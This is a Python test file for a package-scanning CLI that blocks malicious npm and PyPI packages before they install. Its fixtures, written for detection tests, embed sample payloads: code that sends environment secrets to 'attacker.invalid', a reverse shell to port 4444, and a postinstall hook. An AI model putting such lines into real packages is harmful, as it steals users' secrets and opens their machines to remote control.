"""End-to-end CLI policy, private reporting, and prevention using local registries."""
import json
import os
import subprocess
import sys

import pytest

from backend.guardian import cli, core, local_reports, npm_adapter, pypi_adapter
from backend.guardian.policy import Policy, evaluate
from backend.guardian.supply_models import InstallError, IntegrityError
from backend.tests.test_cli_npm import package, registry as npm_registry
from backend.tests.test_cli_pypi import wheel, registry as pypi_registry


@pytest.fixture
def local(monkeypatch, tmp_path):
    project = tmp_path / 'project'
    project.mkdir()
    monkeypatch.chdir(project)
    monkeypatch.setenv('GUARDIAN_HOME', str(tmp_path / 'reports'))
    return project


def test_npm_cli_blocks_transitive_malware_before_installer(monkeypatch, local, capsys):
    marker = local / 'hook-ran'
    npm_registry(monkeypatch, [package(dependencies={'bad-child': '1.0.0'}), package('bad-child',
        source='fetch("https://attacker.invalid", {body: process.env.SECRET});',
        scripts={'postinstall': f'node -e "require(\'fs\').writeFileSync(\'{marker}\',\'ran\')"'})])
    monkeypatch.setattr(npm_adapter, 'install', lambda *args: pytest.fail('blocked package reached installer'))
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--json']) == cli.EXIT_BLOCK
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['decision']['decision'] == 'BLOCK'
    assert report['cli']['installation']['status'] == 'blocked before installation'
    finding = next(f for f in report['findings'] if f['rule'] == 'SENSITIVE_TRANSMISSION')
    assert finding['package'] == 'bad-child@1.0.0' and finding['ecosystem'] == 'npm'
    assert len(finding['artifact_sha256']) == 64 and finding['evidence'] and finding['confidence'] in ('high', 'medium')
    assert not marker.exists() and not (local / 'node_modules').exists()
    assert local_reports.latest().id == report['id']


def test_pypi_cli_blocks_wheel_before_installer(monkeypatch, local, capsys):
    pypi_registry(monkeypatch, {('bad_python', '1.0.0'): wheel('bad_python', code='import socket, subprocess\nsocket.create_connection(("attacker.invalid", 4444))\nsubprocess.call(["sh"])\n')})
    monkeypatch.setattr(pypi_adapter, 'install', lambda *args: pytest.fail('blocked wheel reached installer'))
    assert cli.main(['install', 'bad-python', '--ecosystem', 'pypi', '--json']) == cli.EXIT_BLOCK
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['decision']['decision'] == 'BLOCK'
    assert any(f['rule'] == 'REVERSE_SHELL' and f['ecosystem'] == 'pypi' and f['artifact_sha256'] for f in report['findings'])


def test_npm_cli_real_benign_install(monkeypatch, local, capsys):
    npm_registry(monkeypatch, [package('guardian-cli-benign', source='module.exports = 42;')])
    assert cli.main(['install', 'guardian-cli-benign', '--ecosystem', 'npm', '--json']) == 0
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['installation']['status'] == 'installed'
    assert (local / 'node_modules/guardian-cli-benign/index.js').read_text() == 'module.exports = 42;'
    assert json.loads((local / 'package-lock.json').read_text())['packages']['node_modules/guardian-cli-benign']['version'] == '1.0.0'


def test_pypi_cli_real_benign_install(monkeypatch, local, capsys, tmp_path):
    target = tmp_path / 'environment'
    subprocess.run([sys.executable, '-m', 'venv', str(target)], check=True, capture_output=True, timeout=60)
    monkeypatch.setenv('VIRTUAL_ENV', str(target))
    pypi_registry(monkeypatch, {('guardian_benign', '1.0.0'): wheel()})
    assert cli.main(['install', 'guardian-benign', '--ecosystem', 'pypi', '--json']) == 0
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['installation']['status'] == 'installed'
    paths = list(target.glob('lib/python*/site-packages/guardian_benign/__init__.py'))
    if os.name == 'nt':
        paths = list(target.glob('Lib/site-packages/guardian_benign/__init__.py'))
    assert len(paths) == 1 and paths[0].read_bytes() == b'VALUE = 42\n'


def test_offline_check_export_and_report_no_network(monkeypatch, local, capsys):
    _, raw = package()
    artifact = local / 'alpha.tgz'
    artifact.write_bytes(raw)
    monkeypatch.setattr(npm_adapter, 'resolve', lambda *args, **kwargs: pytest.fail('offline local input resolved online'))
    export = local / 'export.json'
    assert cli.main(['check', str(artifact), '--ecosystem', 'npm', '--offline', '--json', '--output', str(export)]) == cli.EXIT_REVIEW
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['decision']['decision'] == 'REVIEW'
    assert 'integrity' in ' '.join(report['cli']['decision']['reasons']).lower()
    assert not (local / 'node_modules').exists()
    assert json.loads(export.read_text())['id'] == report['id']
    if os.name != 'nt':
        assert export.stat().st_mode & 0o077 == 0
    assert cli.main(['report', '--json']) == 0
    assert json.loads(capsys.readouterr().out)['id'] == report['id']


def test_project_audit_excludes_secrets_and_does_not_install(monkeypatch, local, capsys):
    (local / 'package.json').write_text('{"name":"project"}')
    (local / 'index.js').write_text('module.exports = 42;')
    (local / '.env.txt').write_text('SECRET="not-for-report"')
    (local / '.git').mkdir()
    (local / '.git/hidden.js').write_text('fetch("x", {body: process.env.KEY});')
    (local / 'private.pem').write_text('PRIVATE KEY')
    artifact = cli.project_artifact(local, 'npm')
    assert set(artifact.files) == {'index.js', 'package.json'}
    assert cli.main(['audit', '--offline', '--json']) == cli.EXIT_REVIEW
    assert 'not-for-report' not in capsys.readouterr().out
    assert not (local / 'node_modules').exists()


def test_ambiguous_ecosystem_never_guessed(local, capsys):
    (local / 'package.json').write_text('{}')
    (local / 'requirements.txt').touch()
    assert cli.main(['check', 'requests', '--json']) == cli.EXIT_ACQUIRE
    assert 'ambiguous' in json.loads(capsys.readouterr().out)['error']


def test_no_fake_connected_auth_or_automatic_sync(local, capsys):
    for command in ('login', 'sync'):
        # Account commands now work when configured; offline mode must never fake a login.
        assert cli.main([command, '--offline', '--json']) == cli.EXIT_ACQUIRE
        assert 'requires network access' in json.loads(capsys.readouterr().out)['error']
    assert cli.main(['status', '--json']) == 0
    assert json.loads(capsys.readouterr().out)['automatic_sync'] is False
    assert cli.main(['logout', '--json']) == 0
    assert json.loads(capsys.readouterr().out)['authenticated'] is False


def test_acquisition_integrity_and_install_failure_exit_codes(monkeypatch, local, capsys):
    monkeypatch.setattr(npm_adapter, 'resolve', lambda *a, **kw: (_ for _ in ()).throw(IntegrityError('mismatch')))
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--json']) == cli.EXIT_INTEGRITY
    assert json.loads(capsys.readouterr().out)['exit_code'] == cli.EXIT_INTEGRITY


def test_install_failure_is_saved_without_success(monkeypatch, local, capsys):
    npm_registry(monkeypatch, [package()])
    monkeypatch.setattr(npm_adapter, 'install', lambda *a: (_ for _ in ()).throw(InstallError('disk full')))
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--json']) == cli.EXIT_INSTALL
    data = json.loads(capsys.readouterr().out)
    assert data['cli']['installation'] == {'status': 'failed', 'reason': 'disk full'}
    assert local_reports.latest().cli['installation']['status'] == 'failed'


def test_policy_thresholds_coverage_and_overrides(monkeypatch, local, capsys):
    npm_registry(monkeypatch, [package(source='fetch("https://attacker.invalid", {body: process.env.SECRET});')])
    plan = npm_adapter.resolve(['alpha'], local)
    report = core.analyze_plan(plan)
    assert report.cli['decision']['decision'] == 'BLOCK'
    source_finding = next(f for f in report.findings if f.rule == 'SENSITIVE_TRANSMISSION')
    low = source_finding.model_copy(update={'confidence': 'low'})
    assert evaluate([low], verified=True, complete=True, limitations=[])['decision'] == 'WARN'
    assert evaluate([], verified=False, complete=True, limitations=[])['decision'] == 'REVIEW'
    assert evaluate([], verified=True, complete=False, limitations=[])['overridable'] is False
    assert evaluate([], verified=True, complete=True, limitations=[], policy=Policy(require_intelligence=True))['decision'] == 'REVIEW'
    installed = []
    monkeypatch.setattr(npm_adapter, 'install', lambda *a: installed.append(True))
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--force', '--json']) == cli.EXIT_BLOCK
    capsys.readouterr()
    assert not installed
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--force', '--yes', '--json']) == 0
    data = json.loads(capsys.readouterr().out)
    assert installed and data['cli']['overrides'][0]['force'] is True
    assert data['cli']['decision']['decision'] == 'BLOCK'  # override does not erase verdict


def test_incomplete_source_cannot_be_forced(monkeypatch, local, capsys):
    npm_registry(monkeypatch, [package(source='const = ;')])
    monkeypatch.setattr(npm_adapter, 'install', lambda *a: pytest.fail('incomplete source installed'))
    assert cli.main(['install', 'alpha', '--ecosystem', 'npm', '--force', '--yes', '--json']) == cli.EXIT_REVIEW
    assert json.loads(capsys.readouterr().out)['cli']['decision']['overridable'] is False


def test_both_adapters_use_shared_core(monkeypatch, local):
    npm_registry(monkeypatch, [package()])
    pypi_registry(monkeypatch, {('guardian_benign', '1.0.0'): wheel()})
    plans = [npm_adapter.resolve(['alpha'], local), pypi_adapter.resolve(['guardian-benign'], local)]
    observed = []
    original = core.analyze_sources
    def trace(files, **kwargs):
        observed.append(set(files))
        return original(files, **kwargs)
    monkeypatch.setattr(core, 'analyze_sources', trace)
    reports = [core.analyze_plan(plan) for plan in plans]
    assert len(observed) == 2
    assert all(r.cli['decision']['decision'] == 'ALLOW' for r in reports)
    assert all(r.inspections[0].artifact_sha256 == p.artifacts[0].sha256 for r, p in zip(reports, plans))


def test_missing_dependency_edges_cannot_be_allowed(monkeypatch, local):
    npm_registry(monkeypatch, [package()])
    plan = npm_adapter.resolve(['alpha'], local)
    plan.artifacts[0].dependencies.append('npm:unacquired@1.0.0')
    report = core.analyze_plan(plan)
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert report.cli['decision']['overridable'] is False


@pytest.mark.parametrize('eco', ['npm', 'pypi'])
def test_cli_report_handoff_preserves_exact_dependency_association(monkeypatch, local, eco):
    from backend.guardian.handoff import handoff_service
    if eco == 'npm':
        npm_registry(monkeypatch, [package('affected', source='fetch("https://attacker.invalid", {body: process.env.SECRET});')])
        plan = npm_adapter.resolve(['affected'], local)
    else:
        pypi_registry(monkeypatch, {('affected', '1.0.0'): wheel('affected', code='import requests, os\nrequests.post("https://attacker.invalid", json=dict(os.environ))\n')})
        plan = pypi_adapter.resolve(['affected'], local)
    report = core.analyze_plan(plan)
    finding = next(f for f in report.findings if f.rule == 'SENSITIVE_TRANSMISSION')
    canonical = handoff_service.build_canonical(report, finding_ids=[finding.id])
    assert len(canonical.dependencies) == 1
    assert canonical.dependencies[0].name == 'affected' and canonical.dependencies[0].ecosystem == eco
    assert canonical.findings[0].artifact_sha256 == plan.artifacts[0].sha256
    assert canonical.findings[0].ecosystem == eco


def test_policy_file_validation_and_private_store(local, tmp_path):
    path = tmp_path / 'policy.json'
    path.write_text('{"block_severity":"critical","require_intelligence":true}')
    assert Policy.load(path).block_severity == 'critical'
    path.write_text('{"block_confidence":"certain"}')
    with pytest.raises(ValueError):
        Policy.load(path)
    destination = local / 'private.json'
    target = local / 'target.json'
    target.write_text('untouched')
    destination.symlink_to(target)
    with pytest.raises(ValueError):
        local_reports.write_private(destination, 'changed')
    assert target.read_text() == 'untouched'


def test_terminal_output_does_not_execute_control_codes():
    from backend.guardian.models import Report
    report = Report(id='x', name='x', version='1', created_at='now', source='CLI', risk='x', rationale='',
                    findings=[], dependencies=[], files_analyzed=0, coverage=['\x1b[2J'], intelligence='not checked', duration_ms=0,
                    cli={'decision': {'decision': 'REVIEW', 'reasons': ['\x1b]8;;evil\x07']}})
    assert '\x1b' not in cli.terminal(report, True) and '\x07' not in cli.terminal(report, True)


def test_concurrent_install_guard_fails_closed_and_cleans_up(local):
    with cli.installation_guard(local):
        with pytest.raises(InstallError, match='Another Guardian'):
            with cli.installation_guard(local):
                pytest.fail('concurrent install was allowed')
    assert not (local / '.guardian-install.lock').exists()


def test_actual_unsupported_flow_coverage_requires_review(monkeypatch, local):
    npm_registry(monkeypatch, [package(source='setTimeout(() => { console.log("callback"); }, 100);')])
    report = core.analyze_plan(npm_adapter.resolve(['alpha'], local))
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert report.cli['decision']['overridable'] is False
